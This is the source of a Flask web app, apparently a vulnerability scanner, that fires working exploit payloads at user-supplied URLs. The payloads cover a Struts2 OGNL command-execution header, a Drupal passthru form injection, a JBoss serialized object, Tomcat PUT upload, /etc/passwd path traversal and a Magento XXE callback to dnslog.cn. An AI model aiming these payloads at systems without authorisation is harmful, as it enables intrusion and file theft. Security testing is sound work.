import os
import re
import time
import requests
import urllib3
from flask import Flask, render_template, request, redirect, url_for, flash
from urllib.parse import urljoin
from datetime import datetime

# ç¦ç”¨ SSL è­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = 'supersecretkey'


# æ·»åŠ ä¸Šä¸‹æ–‡å¤„ç†å™¨
@app.context_processor
def inject_now():
    return {'now': datetime.now()}


# æ¼æ´æ£€æµ‹å‡½æ•° (ä¿æŒä¸å˜)
def check_magento_xxe(url):
    """æ£€æµ‹ Adobe Magento XXE æ¼æ´ (CVE-2024-34102)"""
    url = url.rstrip("/")
    target_url = urljoin(url, "/rest/V1/guest-carts/1/estimate-shipping-methods")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
            "Content-Type": "application/json"
        }

        # è·å– DNSLog åŸŸå
        getdomain = requests.get(
            'http://dnslog.cn/getdomain.php',
            headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"},
            timeout=30
        )
        domain = str(getdomain.text)

        # æ„é€ æ¶æ„è¯·æ±‚
        data = """{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"http://%s","dataIsURL":true,"options":12345678}}}}}}""" % domain
        requests.post(target_url, data=data, headers=headers, verify=False, timeout=25)

        # æ£€æŸ¥ DNS è®°å½•
        for _ in range(3):
            time.sleep(1)
            refresh = requests.get(
                'http://dnslog.cn/getrecords.php',
                headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"},
                timeout=30
            )
            if domain in refresh.text:
                return True, "AdobeMagento_CVE-2024-34102_XXE"

        return False, "æœªæ£€æµ‹åˆ°æ¼æ´"

    except Exception as e:
        return False, f"æ£€æµ‹å¤±è´¥: {str(e)}"


def check_adobe_coldfusion(url):
    """æ£€æµ‹ Adobe ColdFusion ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2024-20767)"""
    url = url.rstrip("/")
    target = urljoin(url, "/CFIDE/administrator/enter.cfm")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
        }

        # æ„é€ æ¶æ„è¯·æ±‚è¯»å– /etc/passwd
        response = requests.get(
            target + "?file=../../../../etc/passwd",
            headers=headers,
            verify=False,
            timeout=15
        )

        if response.status_code == 200 and 'root:' in response.text:
            return True, "AdobeColdFusion_CVE-2024-20767_ArbitraryFileRead"
        else:
            return False, "æœªæ£€æµ‹åˆ°æ¼æ´"

    except Exception as e:
        return False, f"æ£€æµ‹å¤±è´¥: {str(e)}"


def check_struts2_rce(url):
    """æ£€æµ‹ Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (CVE-2017-5638)"""
    url = url.rstrip("/")

    try:
        headers = {
            "Content-Type": "%{(#nike='multipart/form-data')."
                            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                            "(#_memberAccess?(#_memberAccess=#dm):"
                            "((#container=#context['æ.opensymphony.xwork2.ActionContext.container'])."
                            "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                            "(#ognlUtil.getExcludedPackageNames().clear())."
                            "(#ognlUtil.getExcludedClasses().clear())."
                            "(#context.setMemberAccess(#dm))))."
                            "(#cmd='echo VulnScanner_Struts2_RCE')."
                            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                            "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                            "(#p=new java.lang.ProcessBuilder(#cmds))."
                            "(#p.redirectErrorStream(true))."
                            "(#process=#p.start())."
                            "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                            "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                            "(#ros.flush())}"
        }

        response = requests.get(url, headers=headers, verify=False, timeout=15)

        if "VulnScanner_Struts2_RCE" in response.text:
            return True, "Struts2_CVE-2017-5638_RCE"
        else:
            return False, "æœªæ£€æµ‹åˆ°æ¼æ´"

    except Exception as e:
        return False, f"æ£€æµ‹å¤±è´¥: {str(e)}"


def check_tomcat_file_upload(url):
    """æ£€æµ‹ Tomcat ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ (CVE-2017-12615)"""
    url = url.rstrip("/")
    test_url = url + "/vulnscanner_test.txt"

    try:
        # å°è¯• PUT æ–¹æ³•ä¸Šä¼ æ–‡ä»¶
        response = requests.put(
            test_url,
            data="VulnScanner Test File",
            verify=False,
            timeout=15
        )

        if response.status_code in [201, 204]:
            # éªŒè¯æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸ
            get_response = requests.get(test_url, verify=False, timeout=15)
            if get_response.status_code == 200 and "VulnScanner Test File" in get_response.text:
                # æ¸…ç†æµ‹è¯•æ–‡ä»¶
                try:
                    requests.delete(test_url, verify=False, timeout=5)
                except:
                    pass
                return True, "Tomcat_CVE-2017-12615_FileUpload"
            # æ¸…ç†æµ‹è¯•æ–‡ä»¶
            try:
                requests.delete(test_url, verify=False, timeout=5)
            except:
                pass

        return False, "æœªæ£€æµ‹åˆ°æ¼æ´"

    except Exception as e:
        return False, f"æ£€æµ‹å¤±è´¥: {str(e)}"


def check_jboss_deserialization(url):
    """æ£€æµ‹ JBoss ååºåˆ—åŒ–æ¼æ´ (CVE-2017-12149)"""
    url = url.rstrip("/")
    target_url = urljoin(url, "/invoker/readonly")

    try:
        payload = (
            "aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279"
            "787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb020001"
            "4c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e4861"
            "6e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a65"
            "6374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176"
            "612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007870"
            "77040000000000000000740012456e61626c6564436865636b65644f757478"
        )

        response = requests.post(
            target_url,
            data=bytes.fromhex(payload),
            headers={"Content-Type": "application/json"},
            verify=False,
            timeout=15
        )

        if response.status_code == 500 and "Deserialization" in response.text:
            return True, "JBoss_CVE-2017-12149_Deserialization"
        else:
            return False, "æœªæ£€æµ‹åˆ°æ¼æ´"

    except Exception as e:
        return False, f"æ£€æµ‹å¤±è´¥: {str(e)}"


def check_drupal_rce(url):
    """æ£€æµ‹ Drupal è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (CVE-2018-7600)"""
    url = url.rstrip("/")
    target_url = urljoin(url,
                         "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax")

    try:
        payload = {
            "form_id": "user_register_form",
            "_drupal_ajax": "1",
            "mail[#post_render][]": "passthru",
            "mail[#type]": "markup",
            "mail[#markup]": "echo VulnScanner_Drupal_RCE"
        }

        response = requests.post(
            target_url,
            data=payload,
            verify=False,
            timeout=15
        )

        if "VulnScanner_Drupal_RCE" in response.text:
            return True, "Drupal_CVE-2018-7600_RCE"
        else:
            return False, "æœªæ£€æµ‹åˆ°æ¼æ´"

    except Exception as e:
        return False, f"æ£€æµ‹å¤±è´¥: {str(e)}"


def check_nexus_rce(url):
    """æ£€æµ‹ Nexus Repository Manager è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (CVE-2019-7238)"""
    url = url.rstrip("/")
    target_url = urljoin(url, "/service/rest/beta/repositories/go/group")

    try:
        payload = {
            "name": "internal",
            "blobStoreName": "default",
            "strictContentTypeValidation": True,
            "groupWriteMember": "ext://../etc/passwd"
        }

        response = requests.post(
            target_url,
            json=payload,
            verify=False,
            timeout=15
        )

        if response.status_code == 400 and "ext://../etc/passwd" in response.text:
            return True, "Nexus_CVE-2019-7238_RCE"
        else:
            return False, "æœªæ£€æµ‹åˆ°æ¼æ´"

    except Exception as e:
        return False, f"æ£€æµ‹å¤±è´¥: {str(e)}"


# æ‰«æå‡½æ•°
def scan_target(url, scan_type):
    """æ‰«æç›®æ ‡URL"""
    results = []

    # æ£€æµ‹æ‰€æœ‰æ¼æ´ç±»å‹
    if scan_type == "all":
        checks = [
            ("Adobe Magento XXE", check_magento_xxe),
            ("Adobe ColdFusion ä»»æ„æ–‡ä»¶è¯»å–", check_adobe_coldfusion),
            ("Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œ", check_struts2_rce),
            ("Tomcat ä»»æ„æ–‡ä»¶ä¸Šä¼ ", check_tomcat_file_upload),
            ("JBoss ååºåˆ—åŒ–", check_jboss_deserialization),
            ("Drupal è¿œç¨‹ä»£ç æ‰§è¡Œ", check_drupal_rce),
            ("Nexus è¿œç¨‹ä»£ç æ‰§è¡Œ", check_nexus_rce)
        ]
    else:
        # æ ¹æ®é€‰æ‹©çš„æ‰«æç±»å‹æ‰§è¡Œç‰¹å®šæ£€æµ‹
        scan_map = {
            "xxe": [("Adobe Magento XXE", check_magento_xxe)],
            "rce": [
                ("Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œ", check_struts2_rce),
                ("Drupal è¿œç¨‹ä»£ç æ‰§è¡Œ", check_drupal_rce),
                ("Nexus è¿œç¨‹ä»£ç æ‰§è¡Œ", check_nexus_rce)
            ],
            "file": [
                ("Adobe ColdFusion ä»»æ„æ–‡ä»¶è¯»å–", check_adobe_coldfusion),
                ("Tomcat ä»»æ„æ–‡ä»¶ä¸Šä¼ ", check_tomcat_file_upload)
            ],
            "deserialization": [("JBoss ååºåˆ—åŒ–", check_jboss_deserialization)]
        }
        checks = scan_map.get(scan_type, [])

    # æ‰§è¡Œæ£€æµ‹
    for name, func in checks:
        start_time = time.time()
        try:
            vulnerable, message = func(url)
        except Exception as e:
            vulnerable = False
            message = f"æ£€æµ‹è¿‡ç¨‹ä¸­å‡ºé”™: {str(e)}"
        elapsed = time.time() - start_time

        results.append({
            "name": name,
            "vulnerable": vulnerable,
            "message": message,
            "time": f"{elapsed:.2f}ç§’"
        })

    return results


# Flask è·¯ç”±
@app.route('/')
def index():
    """é¦–é¡µ"""
    return render_template('index.html')


@app.route('/scan', methods=['POST'])
def scan():
    """æ‰§è¡Œæ‰«æ"""
    url = request.form.get('url')
    scan_type = request.form.get('scan_type', 'all')

    if not url:
        flash('è¯·è¾“å…¥ç›®æ ‡URL', 'danger')
        return redirect(url_for('index'))

    try:
        results = scan_target(url, scan_type)
        return render_template('results.html', url=url, scan_type=scan_type, results=results)
    except Exception as e:
        flash(f'æ‰«æè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {str(e)}', 'danger')
        return redirect(url_for('index'))


@app.route('/batch_scan', methods=['POST'])
def batch_scan():
    """æ‰¹é‡æ‰«æ"""
    if 'file' not in request.files:
        flash('æœªé€‰æ‹©æ–‡ä»¶', 'danger')
        return redirect(url_for('index'))

    file = request.files['file']
    scan_type = request.form.get('batch_scan_type', 'all')

    if file.filename == '':
        flash('æœªé€‰æ‹©æ–‡ä»¶', 'danger')
        return redirect(url_for('index'))

    try:
        # è¯»å–æ–‡ä»¶å†…å®¹
        content = file.read().decode('utf-8')
        urls = [line.strip() for line in content.splitlines() if line.strip()]

        # é™åˆ¶æ‰«ææ•°é‡
        max_urls = 20
        if len(urls) > max_urls:
            urls = urls[:max_urls]
            flash(f'ä¸ºäº†æ€§èƒ½è€ƒè™‘ï¼Œåªæ‰«æå‰{max_urls}ä¸ªURL', 'warning')

        # æ‰§è¡Œæ‰¹é‡æ‰«æ
        results = []
        for url in urls:
            try:
                scan_results = scan_target(url, scan_type)
                vulnerabilities_count = sum(1 for r in scan_results if r['vulnerable'])
                results.append({
                    "url": url,
                    "vulnerabilities_count": vulnerabilities_count,
                    "details": scan_results
                })
            except Exception as e:
                results.append({
                    "url": url,
                    "error": str(e)
                })

        return render_template('batch_results.html', results=results, scan_type=scan_type)

    except Exception as e:
        flash(f'æ–‡ä»¶å¤„ç†é”™è¯¯: {str(e)}', 'danger')
        return redirect(url_for('index'))


@app.route('/vulnerabilities')
def vulnerabilities():
    """æ¼æ´åº“é¡µé¢"""
    vuln_db = [
        {
            "id": "CVE-2024-34102",
            "name": "Adobe Magento XXE",
            "description": "Adobe Commerce å’Œ Magento Open Source ä¸­çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚",
            "severity": "é«˜å±",
            "affected_versions": "Magento Open Source < 2.4.7, Adobe Commerce < 2.4.7",
            "solution": "å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬æˆ–åº”ç”¨å®‰å…¨è¡¥ä¸"
        },
        {
            "id": "CVE-2024-20767",
            "name": "Adobe ColdFusion ä»»æ„æ–‡ä»¶è¯»å–",
            "description": "Adobe ColdFusion ä¸­çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ã€‚",
            "severity": "é«˜å±",
            "affected_versions": "ColdFusion 2023 < Update 1, ColdFusion 2021 < Update 9",
            "solution": "å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬æˆ–åº”ç”¨å®‰å…¨è¡¥ä¸"
        },
        {
            "id": "CVE-2017-5638",
            "name": "Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œ",
            "description": "Apache Struts2 çš„ Jakarta Multipart è§£æå™¨å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶é€šè¿‡ä¿®æ”¹ HTTP è¯·æ±‚å¤´ä¸­çš„ Content-Type å€¼è§¦å‘è¯¥æ¼æ´ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚",
            "severity": "ä¸¥é‡",
            "affected_versions": "Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10",
            "solution": "å‡çº§åˆ° Struts 2.3.32 æˆ– 2.5.10.1 åŠä»¥ä¸Šç‰ˆæœ¬"
        },
        {
            "id": "CVE-2017-12615",
            "name": "Tomcat ä»»æ„æ–‡ä»¶ä¸Šä¼ ",
            "description": "å½“ Tomcat è¿è¡Œåœ¨ Windows ä¸»æœºä¸Šï¼Œä¸”å¯ç”¨äº† HTTP PUT æ–¹æ³•æ—¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ çš„è¯·æ±‚ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œç”šè‡³ä¸Šä¼  JSP æ–‡ä»¶å¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚",
            "severity": "é«˜å±",
            "affected_versions": "Apache Tomcat 7.0.0 - 7.0.79",
            "solution": "å‡çº§åˆ° 7.0.81 åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œæˆ–ç¦ç”¨ PUT æ–¹æ³•"
        },
        {
            "id": "CVE-2017-12149",
            "name": "JBoss ååºåˆ—åŒ–",
            "description": "JBoss AS 5.x/6.x çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®æœåŠ¡å™¨ JMX Invoker æ¥å£çš„ readonly æ–¹æ³•ï¼Œä¼ å…¥ç²¾å¿ƒæ„é€ çš„åºåˆ—åŒ–æ•°æ®ï¼Œä»è€Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚",
            "severity": "ä¸¥é‡",
            "affected_versions": "JBoss AS 5.x, 6.x",
            "solution": "å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬æˆ–åˆ é™¤ jmx-invoker-service.xml æ–‡ä»¶"
        },
        {
            "id": "CVE-2018-7600",
            "name": "Drupal è¿œç¨‹ä»£ç æ‰§è¡Œ",
            "description": "Drupal ä¸­çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚",
            "severity": "ä¸¥é‡",
            "affected_versions": "Drupal 7.x, 8.x",
            "solution": "å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬æˆ–åº”ç”¨å®‰å…¨è¡¥ä¸"
        },
        {
            "id": "CVE-2019-7238",
            "name": "Nexus Repository Manager è¿œç¨‹ä»£ç æ‰§è¡Œ",
            "description": "Nexus Repository Manager ä¸­çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚",
            "severity": "é«˜å±",
            "affected_versions": "Nexus Repository Manager 3.x < 3.15.0",
            "solution": "å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬æˆ–åº”ç”¨å®‰å…¨è¡¥ä¸"
        }
    ]

    return render_template('vulnerabilities.html', vuln_db=vuln_db)


# æ·»åŠ  404 é”™è¯¯å¤„ç†å™¨
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


# åˆ›å»º templates ç›®å½•å¹¶æ·»åŠ åŸºæœ¬æ¨¡æ¿
def ensure_template_directory():
    """ç¡®ä¿æ¨¡æ¿ç›®å½•å­˜åœ¨å¹¶åˆ›å»ºåŸºæœ¬æ¨¡æ¿æ–‡ä»¶"""
    templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
    os.makedirs(templates_dir, exist_ok=True)

    # åˆ›å»º index.html
    index_path = os.path.join(templates_dir, 'index.html')
    with open(index_path, 'w', encoding='utf-8') as f:
        f.write("""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ¼æ´æ‰«æç³»ç»Ÿ - VulnScanner</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --primary: #1a1a2e;
            --secondary: #16213e;
            --accent: #e94560;
            --warning: #ff9a3c;
            --success: #0f9d58;
            --info: #4285f4;
            --text-light: #f0f0f0;
            --text-dark: #333;
            --card-bg: rgba(255, 255, 255, 0.08);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: var(--text-light);
            min-height: 100vh;
            background-attachment: fixed;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(10, 10, 20, 0.85);
            backdrop-filter: blur(10px);
            padding: 15px 0;
            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 1.8rem;
            color: var(--text-light);
            text-decoration: none;
        }

        .logo-icon {
            color: var(--accent);
            font-size: 2rem;
        }

        .nav-links {
            display: flex;
            gap: 25px;
        }

        .nav-link {
            color: var(--text-light);
            text-decoration: none;
            font-weight: 500;
            font-size: 1.1rem;
            transition: var(--transition);
            padding: 8px 15px;
            border-radius: 4px;
        }

        .nav-link:hover, .nav-link.active {
            background: rgba(233, 69, 96, 0.2);
            color: var(--accent);
        }

        .hero {
            padding: 80px 0 50px;
            text-align: center;
            max-width: 800px;
            margin: 0 auto;
        }

        .hero h1 {
            font-size: 3.2rem;
            margin-bottom: 20px;
            font-weight: 700;
            background: linear-gradient(45deg, var(--accent), var(--warning));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-family: 'Orbitron', sans-serif;
        }

        .hero p {
            font-size: 1.3rem;
            opacity: 0.85;
            margin-bottom: 40px;
        }

        .card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: var(--transition);
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
            border-color: rgba(233, 69, 96, 0.4);
        }

        .card-title {
            font-size: 1.6rem;
            margin-bottom: 20px;
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }

        input, select, textarea {
            width: 100%;
            padding: 14px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            color: var(--text-light);
            font-size: 1rem;
            transition: var(--transition);
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: var(--accent);
            background: rgba(0, 0, 0, 0.4);
        }

        .btn {
            display: inline-block;
            background: var(--accent);
            color: white;
            border: none;
            padding: 14px 30px;
            font-size: 1.1rem;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
        }

        .btn:hover {
            background: #ff2e4f;
            transform: translateY(-3px);
            box-shadow: 0 7px 15px rgba(233, 69, 96, 0.3);
        }

        .btn-block {
            display: block;
            width: 100%;
        }

        .btn-secondary {
            background: var(--info);
        }

        .btn-secondary:hover {
            background: #2b6de9;
        }

        .flex-container {
            display: flex;
            gap: 30px;
            margin-bottom: 40px;
        }

        .flex-container .card {
            flex: 1;
        }

        .result-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }

        .vuln-card {
            background: rgba(0, 0, 0, 0.25);
            border-radius: 10px;
            padding: 20px;
            transition: var(--transition);
            border-left: 4px solid var(--accent);
        }

        .vuln-card.safe {
            border-left-color: var(--success);
        }

        .vuln-card.vulnerable {
            border-left-color: var(--accent);
            background: rgba(233, 69, 96, 0.1);
        }

        .vuln-card h3 {
            font-size: 1.2rem;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 500;
        }

        .status-vulnerable {
            background: var(--accent);
        }

        .status-safe {
            background: var(--success);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 25px 0;
        }

        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        th {
            background: rgba(0, 0, 0, 0.3);
            font-weight: 500;
            color: var(--accent);
        }

        tr:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .chart-container {
            height: 300px;
            margin: 30px 0;
        }

        footer {
            text-align: center;
            padding: 40px 0;
            margin-top: 60px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.6);
        }

        .alert {
            padding: 15px;
            border-radius: 6px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .alert-danger {
            background: rgba(233, 69, 96, 0.2);
            border: 1px solid var(--accent);
        }

        .alert-warning {
            background: rgba(255, 154, 60, 0.2);
            border: 1px solid var(--warning);
        }

        .alert-success {
            background: rgba(15, 157, 88, 0.2);
            border: 1px solid var(--success);
        }

        .severity-badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 4px;
            font-size: 0.85rem;
            font-weight: 500;
        }

        .severity-high {
            background: var(--accent);
        }

        .severity-critical {
            background: #d32f2f;
        }

        .severity-medium {
            background: var(--warning);
        }

        /* Responsive styles */
        @media (max-width: 768px) {
            .flex-container {
                flex-direction: column;
            }

            .hero h1 {
                font-size: 2.5rem;
            }

            .nav-links {
                display: none;
            }

            .result-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="navbar">
                <a href="/" class="logo">
                    <span class="logo-icon">ğŸ”’</span>
                    <span>VulnScanner</span>
                </a>
                <div class="nav-links">
                    <a href="/" class="nav-link active">é¦–é¡µ</a>
                    <a href="/vulnerabilities" class="nav-link">æ¼æ´åº“</a>
                </div>
            </div>
        </div>
    </header>

    <main class="container">
        <!-- é¦–é¡µ/æ‰«æé¡µé¢ -->
  <section id="home-page">
    <div class="hero">
        <h1>å®‰å…¨æ¼æ´æ‰«æç³»ç»Ÿ</h1>
        <p>å…¨é¢æ£€æµ‹æ‚¨çš„Webåº”ç”¨ç¨‹åºå®‰å…¨æ¼æ´ï¼Œæä¾›ä¸“ä¸šçš„å®‰å…¨è¯„ä¼°æŠ¥å‘Š</p>
    </div>

    <!-- ä¿®æ”¹å¼€å§‹ï¼šåˆ†ç¦»ä¸¤ä¸ªè¡¨å• -->
    <div class="flex-container">
        <!-- å•ç›®æ ‡æ‰«æå¡ç‰‡ -->
        <div class="card">
            <form action="/scan" method="post">
                <h2 class="card-title">å•ç›®æ ‡æ‰«æ</h2>
                <div class="form-group">
                    <label for="url">ç›®æ ‡URL</label>
                    <input type="url" id="url" name="url" placeholder="https://example.com" required>
                </div>

                <div class="form-group">
                    <label for="scan_type">æ‰«æç±»å‹</label>
                    <select id="scan_type" name="scan_type">
                        <option value="all">å…¨éƒ¨æ‰«æ</option>
                        <option value="xxe">XXEæ¼æ´</option>
                        <option value="rce">è¿œç¨‹ä»£ç æ‰§è¡Œ</option>
                        <option value="file">æ–‡ä»¶æ“ä½œæ¼æ´</option>
                        <option value="deserialization">ååºåˆ—åŒ–æ¼æ´</option>
                    </select>
                </div>

                <button type="submit" class="btn btn-block">å¼€å§‹æ‰«æ</button>
            </form>
        </div>

            <!-- æ‰¹é‡æ‰«æå¡ç‰‡ -->
        <div class="card">
            <form action="/batch_scan" method="post" enctype="multipart/form-data">
                <h2 class="card-title">æ‰¹é‡æ‰«æ</h2>
                <div class="form-group">
                    <label for="file">ä¸Šä¼ URLåˆ—è¡¨æ–‡ä»¶</label>
                    <input type="file" id="file" name="file" accept=".txt" required>
                    <p style="margin-top: 10px; font-size: 0.9rem; opacity: 0.7;">æ¯è¡Œä¸€ä¸ªURLï¼Œæ”¯æŒæœ€å¤š20ä¸ªç›®æ ‡</p>
                </div>

                <div class="form-group">
                    <label for="batch_scan_type">æ‰«æç±»å‹</label>
                    <select id="batch_scan_type" name="batch_scan_type">
                        <option value="all">å…¨éƒ¨æ‰«æ</option>
                        <option value="xxe">XXEæ¼æ´</option>
                        <option value="rce">è¿œç¨‹ä»£ç æ‰§è¡Œ</option>
                        <option value="file">æ–‡ä»¶æ“ä½œæ¼æ´</option>
                        <option value="deserialization">ååºåˆ—åŒ–æ¼æ´</option>
                    </select>
                </div>

                <button type="submit" class="btn btn-block btn-secondary">æ‰¹é‡æ‰«æ</button>
            </form>
        </div>
    </div>
            </form>

            <div class="card">
                <h2 class="card-title">æ¼æ´ç»Ÿè®¡æ¦‚è§ˆ</h2>

                <div class="result-grid">
                    <div class="vuln-card vulnerable">
                        <h3>
                            <span>Adobe Magento XXE</span>
                            <span class="status-badge status-vulnerable">å­˜åœ¨æ¼æ´</span>
                        </h3>
                        <p><strong>CVE:</strong> CVE-2024-34102</p>
                        <p><strong>è¯¦æƒ…:</strong> æ£€æµ‹åˆ°XXEæ¼æ´ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²</p>
                    </div>

                    <div class="vuln-card safe">
                        <h3>
                            <span>Struts2 RCE</span>
                            <span class="status-badge status-safe">å®‰å…¨</span>
                        </h3>
                        <p><strong>CVE:</strong> CVE-2017-5638</p>
                        <p><strong>è¯¦æƒ…:</strong> æœªæ£€æµ‹åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p>
                    </div>

                    <div class="vuln-card vulnerable">
                        <h3>
                            <span>Tomcat æ–‡ä»¶ä¸Šä¼ </span>
                            <span class="status-badge status-vulnerable">å­˜åœ¨æ¼æ´</span>
                        </h3>
                        <p><strong>CVE:</strong> CVE-2017-12615</p>
                        <p><strong>è¯¦æƒ…:</strong> æ£€æµ‹åˆ°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</p>
                    </div>

                    <div class="vuln-card safe">
                        <h3>
                            <span>JBoss ååºåˆ—åŒ–</span>
                            <span class="status-badge status-safe">å®‰å…¨</span>
                        </h3>
                        <p><strong>CVE:</strong> CVE-2017-12149</p>
                        <p><strong>è¯¦æƒ…:</strong> æœªæ£€æµ‹åˆ°ååºåˆ—åŒ–æ¼æ´</p>
                    </div>
                </div>

                <div class="chart-container">
                    <canvas id="vulnChart"></canvas>
                </div>
            </div>
</section>
    </main>

    <footer>
        <div class="container">
            <p>æ¼æ´æ‰«æç³»ç»Ÿ &copy; {{ now.strftime('%Y') }} - å®‰å…¨é˜²æŠ¤ä¸“å®¶</p>
            <p>æœ€åæ‰«ææ—¶é—´: {{ now.strftime('%Y-%m-%d %H:%M:%S') }}</p>
        </div>
    </footer>

    <script>
        // åˆå§‹åŒ–æ¼æ´ç»Ÿè®¡å›¾è¡¨
        const ctx = document.getElementById('vulnChart').getContext('2d');
        const vulnChart = new Chart(ctx, {
            type: 'doughnut',
            data: {
                labels: ['å­˜åœ¨æ¼æ´', 'å®‰å…¨', 'æœªæ‰«æ'],
                datasets: [{
